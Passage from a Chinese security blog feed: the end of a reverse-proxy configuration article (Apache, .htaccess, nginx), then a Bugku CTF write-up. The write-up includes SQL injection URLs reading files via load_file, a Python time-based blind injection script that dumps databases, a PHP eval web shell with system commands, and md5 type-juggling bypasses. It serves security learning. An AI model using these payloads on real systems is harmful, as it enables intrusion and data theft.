proxy_http</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure></p></blockquote><p>在/etc/apache2/sites-available/下，修改配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ProxyPreserveHost On</span><br><span class="line">    ProxyPass / http://192.168.83.1/  # 指定根URL(/)下的内容映射到给定地址的后端服务器</span><br><span class="line">    ProxyPassReverse / http://192.168.83.1/  </span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">~</span><br></pre></td></tr></table></figure></p><p>重启apache生效配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 reload</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure></p><h3 id="3-htaccess配置反向代理"><a href="#3-htaccess配置反向代理" class="headerlink" title="3. .htaccess配置反向代理"></a>3. .htaccess配置反向代理</h3><p>这种方法配置反向代理准确的说是php反向代理，我们通过.htaccess中配置一些重写规则，然后把请求映射到一个php文件中，这个php帮我们请求上游服务器的内容，然后将上游服务器的返回的内容获取回来发回客户端。这种配置反代的好处是所需权限比较小，但是也有很多弊端，随着网站的复杂度，我们所写的抓取页面的php脚本难度就不大一样了。</p><p><a href="https://github.com/Passer6y/Reverse_proxy" target="_blank" rel="noopener">Github</a>上放了3个php反代脚本的demo，使用说明也见里面的readme即可。</p><p>##0x07 nginx 反向代理</p><h3 id="1-简单反代"><a href="#1-简单反代" class="headerlink" title="1. 简单反代"></a>1. 简单反代</h3><p>Nginx核心配置文件nginx.conf：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> server &#123;</span><br><span class="line">        listen       80;   # 监听端口(web服务端口)</span><br><span class="line">        server_name  localhost;  # 当前服务的域名，这里是本地测试</span><br><span class="line"></span><br><span class="line">        location / &#123;   # 这里的/ 表示把服务器的根目录反代到www.baidu.com的根目录。</span><br><span class="line">            proxy_pass http://www.baidu.com;</span><br><span class="line">proxy_redirect default;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-实例：反代Google"><a href="#2-实例：反代Google" class="headerlink" title="2. 实例：反代Google"></a>2. 实例：反代Google</h3><blockquote><p>测试环境：cent os7<br>条件准备：一个域名，<a href="https://oneinstack.com/auto/" target="_blank" rel="noopener">OneinStack一键安装lnmp</a>，<a href="https://blog.linuxeye.cn/448.html" target="_blank" rel="noopener">Let’s Encrypt 的ssl证书</a></p></blockquote><p>接下来编辑nginx下的主机配置文件：/usr/local/nginx/conf/vhost/<br><img src="https://i.loli.net/2018/07/02/5b3a01bbc6af4.png" alt="Alt text"><br>然后在最后插入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;  </span><br><span class="line">    proxy_set_header  Host  &quot;www.google.com&quot;;</span><br><span class="line">    proxy_set_header  User-Agent $http_user_agent;</span><br><span class="line">    proxy_set_header  Connection &quot;&quot;;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_pass https://www.google.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>检测Nginx配置是否正确：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr vhost]# nginx -t</span><br><span class="line">nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</span><br></pre></td></tr></table></figure></p><p>重载Nginx服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr vhost]# service nginx reload</span><br><span class="line">Reloading nginx configuration (via systemctl):             [  OK  ]</span><br></pre></td></tr></table></figure></p><p>打开google.cuit.store，成功~</p><h2 id="0x08-结语"><a href="#0x08-结语" class="headerlink" title="0x08 结语"></a>0x08 结语</h2><p>这次介绍了我所了解的三种反代情况以及其中一些有意思的玩法。笔者能力有限，第一次写文章有什么理解不对的地方还请大家多多指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://p4.ssl.qhimg.com/t01cb5a2af8acb7cd4d.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最近这段时间频频接触到反代的东西，所以就更进一步的了解了一番, 有什么不对的地方还请大佬们指正~&lt;br&gt;本文需要用到的代码已上传&lt;a href=&quot;https://github.com/Passer6y/Reverse_proxy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Github&lt;/a&gt;&lt;br&gt;&lt;strong&gt;本文由&lt;a href=&quot;https://www.anquanke.com/post/id/150436&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全客&lt;/a&gt;原创发布&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web" scheme="http://passer6y.fun/categories/Web/"/>
    
    
      <category term="Web" scheme="http://passer6y.fun/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Bugku Write Up</title>
    <link href="http://passer6y.fun/2018/07/04/bugkuwp/"/>
    <id>http://passer6y.fun/2018/07/04/bugkuwp/</id>
    <published>2018-07-04T09:00:00.000Z</published>
    <updated>2018-07-05T16:18:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2018/07/04/5b3c8de36b4b7.png" alt=""></p><blockquote><p>之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。<br>本文属i春秋原创奖励计划，禁止转载，<a href="https://bbs.ichunqiu.com/thread-41915-1-1.html" target="_blank" rel="noopener">原文链接</a><br><a id="more"></a></p></blockquote><h1 id="Bugku-Write-Up"><a href="#Bugku-Write-Up" class="headerlink" title="Bugku Write Up"></a>Bugku Write Up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。</p><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">报错</a></h2><blockquote><p>题目说：访问参数为：?id=x不允许包含“–”，空格，单引号，双引号，“union”关键字，<br>查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php</p></blockquote><p>针对上述过滤，我们可以采用如下办法绕过：</p><ul><li>空格：/**/</li><li>--：用#</li><li>union: uni%00on</li><li>引号：hex编码</li></ul><p>下面就可以开心的玩耍了~<br>爆库:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/id=0x3122/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x3a(select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/0,1),floor(rand()*2),0x3a,0x3a/**/)name/**/from/**/information_schema.tables/**/group/**/by/**/name)/**/b)/**/#</span><br></pre></td></tr></table></figure></p><p>发现第二个数据库：sql41<br><img src="https://i.loli.net/2018/06/17/5b260ea91e639.png" alt="Alt text"><br>不过flag并不在这，他让我们查询文件路径。<br>参考这篇<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">文章</a>总结的12个错方式<br>floor报错怎么也读不出文件，于是试了一下extractvalue报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/hex(load_file(0x2f7661722f746573742f6b65795f312e706870)))))/**/#</span><br></pre></td></tr></table></figure></p><p>这里得把load_file()整个函数给hex编码，不然不知道为啥，不出数据<br>读出flag：<br><img src="https://i.loli.net/2018/06/17/5b260eea94bb4.png" alt="Alt text"><br>不过,这只是其中的一节，我们还得想办法弄到后面的字符，这里采用substr()：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/concat(0x5c,substr((load_file(0x2f7661722f746573742f6b65795f312e706870)),100,30),0x5c)),0x5c))/**/#</span><br></pre></td></tr></table></figure><p>截断几次后可以看到flag：<br><img src="https://i.loli.net/2018/06/17/5b260f4f10d60.png" alt="Alt text"></p><p>这题真坑啊，要用中文的两个右双引号包裹才能成功交上去…<br>Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p><h2 id="insert-into"><a href="#insert-into" class="headerlink" title="insert into"></a><a href="3">insert into</a></h2><blockquote><p>参考文章：</p><ul><li><a href="https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html</a></li><li><a href="https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html</a></li><li><a href="https://www.jianshu.com/p/232071aa51ba" target="_blank" rel="noopener">https://www.jianshu.com/p/232071aa51ba</a></li></ul></blockquote><p>题示信息：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">不如写个Python吧</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></p><p>根据题示信息可以知道：只有插入。没有输出，可以用时间盲注。<br>时间盲注就是在之后返回的内容相同，没法进行判断的时候；<br>在mysql数据库中插入sleep()函数，如果()语句能正确执行的话，&amp;&amp;就不会短路，sleep()可以执行，这样响应时间就会增大；而()发生错误没有返回结果时，&amp;&amp;会把sleep()函数短路无法执行；<br>伪造请求头：<br><img src="https://i.loli.net/2018/06/17/5b260f88efcdd.png" alt="Alt text"><br>X-Forwarded-For: 1’ and sleep(5)  and ‘1’ = ‘1<br>注意不能用来括号闭合 ！！<br>脚本如下: 当初想的是自动化脱裤…代码有点简陋，需要完善的地方还是挺多的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,time,string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">max_length = <span class="number">50</span></span><br><span class="line">target = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">cur_database = <span class="string">"'+(select case when (substring((select database() ) from &#123;0&#125; for 1)='&#123;1&#125;') "</span> \</span><br><span class="line">      <span class="string">"then sleep(4) else 1 end) and '1'='1"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解字母</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):  <span class="comment"># i 表示了所要查找的名字的最大长度</span></span><br><span class="line">        next_position = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> characters: <span class="comment"># 0x80=128 , 0x20=32,  32-128为可显示的字符的区间</span></span><br><span class="line"></span><br><span class="line">            payload_ = payload.format(str(i), char)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: payload_</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(target,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += char</span><br><span class="line">                print(flag)</span><br><span class="line">                next_position = <span class="keyword">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> next_position:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定数据库，获取其下全部表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table</span><span class="params">(database)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">        print(<span class="string">"正在查询数据库"</span> + database + <span class="string">"中的表"</span>)</span><br><span class="line">        payload = <span class="string">"'+(select case when (substring(("</span> \</span><br><span class="line">                 <span class="string">"select table_name from information_schema.tables where table_schema='"</span>+ database + <span class="string">"' limit 1 offset "</span>+ str(i) +<span class="string">") "</span> \</span><br><span class="line">                 <span class="string">"from &#123;0&#125; for 1)='&#123;1&#125;') "</span> \</span><br><span class="line">                 <span class="string">"then sleep(4) else 1 end) and '1'='1"</span></span><br><span class="line">        table = get(payload)</span><br><span class="line">        print( <span class="string">"数据库"</span> + database + <span class="string">"的第"</span>+ str(i+<span class="number">1</span>) +<span class="string">"个表"</span>+table)</span><br><span class="line">        get_col(table)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> table:</span><br><span class="line">            print(<span class="string">'数据库'</span>+database+<span class="string">'中的表查询完毕'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查字段</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_col</span><span class="params">(table)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">        print(<span class="string">"正在查询表"</span> + table + <span class="string">"中的字段"</span>)</span><br><span class="line">        payload = <span class="string">"'+(select case when (substring(("</span> \</span><br><span class="line">              <span class="string">"select column_name from information_schema.columns where table_name='"</span>+ table +<span class="string">"' limit 1 offset "</span>+ str(i) +<span class="string">") "</span> \</span><br><span class="line">              <span class="string">"from &#123;0&#125; for 1)='&#123;1&#125;') "</span> \</span><br><span class="line">              <span class="string">"then sleep(4) else 1 end) and '1'='1"</span></span><br><span class="line">        column = get(payload)</span><br><span class="line">        print(<span class="string">"表"</span> + table + <span class="string">"的第"</span> + str(i+<span class="number">1</span>) + <span class="string">"个字段为"</span> + column )</span><br><span class="line">        <span class="comment"># print(column)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> column:</span><br><span class="line">            print(<span class="string">"表"</span> + table + <span class="string">"中的字段查询完毕"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 作为单独的模块使用吧,获取字段详细信息</span></span><br><span class="line"><span class="comment"># def result(column,table):</span></span><br><span class="line"><span class="comment">#     payload = "'+(select case when (substring((select "+column+" from "+table+") from &#123;0&#125; for 1)='&#123;1&#125;') " \</span></span><br><span class="line"><span class="comment">#       "then sleep(4) else 1 end) and '1'='1"</span></span><br><span class="line"><span class="comment">#     print(get(payload))</span></span><br><span class="line"><span class="comment"># a = 'flag'</span></span><br><span class="line"><span class="comment"># result(a,a)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    database1 = get(cur_database)</span><br><span class="line">    table1 = get_table(database1)</span><br></pre></td></tr></table></figure></p><p>最后使用上面被注释掉的那个模块，<br>获取flag：flag{cdbf14c9551d5be5612f7bb5d2867853}</p><h2 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a><a href="4">sql2</a></h2><blockquote><p>题示信息： hint：全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,%<br>这题当时我用brup爆破被过滤的字符也注了很久，sqlmap也跑了就是跑不出<br><img src="https://i.loli.net/2018/06/17/5b260fafe96b3.png" alt="Alt text"><br>上面长度370的是都被过滤了的。<br>后来还是放弃了，去看了下wp，发现还是我太天真了，是.DS_Store源码泄露题。</p></blockquote><p><strong>.DS_Store文件泄露利用简介</strong><br>DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。<br>如果开发人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄露，特别是备份文件、源代码文件</p><p><strong>.DS_Store文件泄露利用</strong><br>这里使用<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a>脚本利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py 120.24.86.145:8007/web2/.DS_Store</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://i.loli.net/2018/06/17/5b260fccda885.png" alt="Alt text"></p><p>当然在这之前需要：<br>使用工具<a href="https://cirt.net/nikto2" target="_blank" rel="noopener">nikto</a>对该网页进行扫描，可以发现/web2/子目录下有.DS_Store文件泄露的漏洞<br><img src="https://i.loli.net/2018/06/17/5b260ff3c08bd.png" alt="Alt text"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a><a href="7">备份是个好习惯</a></h2><p>这里推荐一个<a href="8">CTF中常见的源码泄露利用工具</a>，其实就是一个爆破字典<br>拿到一个index.php.bak<br><img src="https://i.loli.net/2018/06/17/5b26101cc22c9.png" alt="Alt text"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>弱类型数组绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1[]=0&amp;kkeyey2[]=a</span><br></pre></td></tr></table></figure></p><p>Flag:Bugku{OH_YOU_FIND_MY_MOMY}</p><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a><a href="9">求getshell</a></h2><p>文件上传题：<br>初步认定，黑名单+content-type验证，上传.htaccess可以成功但是会被改名<br>图片马也上了，没地方包含…<br>感觉题目有点奇怪。。看了wp之后 改的是表单提交的Content-Type: MUltipart/form-data 进行大小写绕过….<br><img src="https://i.loli.net/2018/06/17/5b26106bc6787.png" alt="Alt text"></p><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a><a href="10">文件包含2</a></h2><p>看源码：文件上传，传了个&lt;?php phpinfo()?&gt; 过滤了&lt;?，但是&lt;没过滤…..<br>传了个一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="keyword">eval</span>($_POST[<span class="string">'A'</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>菜刀连不上，试试命令执行。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;</span><br><span class="line"> system(<span class="string">"ls"</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>看到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;</span><br><span class="line">system(<span class="string">"cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt"</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>SKCTF{uP104D_1nclud3_426fh8_is_Fun} </p><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a><a href="11">这是一个神奇的登陆框</a></h2><p>burp抓包分析，有回显的盲注，改一下上面那个脚本就行，这里直接导出数据包直接跑sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLmap.py -r &quot;path&quot; -p  admin_name --dbs</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b2610979d594.png" alt="Alt text"></p><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a><a href="12">cookies欺骗</a></h2><p>题目地址：<a href="http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>这样访问进去：显示一行乱七八糟的字母<br>filename后参数base64解密：keys.txt</p><p>这里就得想一<br>下用这个方法看index.php，base64编码后<br><a href="http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</a><br>这里还有一个lne参数，控制代码行数，用脚本把源码拿出来：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">line = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> line &lt; <span class="number">100</span>:</span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web11/index.php?line='</span>+str(line) +<span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    responce = s.get(url)</span><br><span class="line">    print(responce.text)</span><br><span class="line">    line = line + <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>伪造cookie ：margin=margin 访问：/web11/index.php?line=&amp;filename=a2V5cy5waHA  其中a2V5cy5waHA 是keys.php 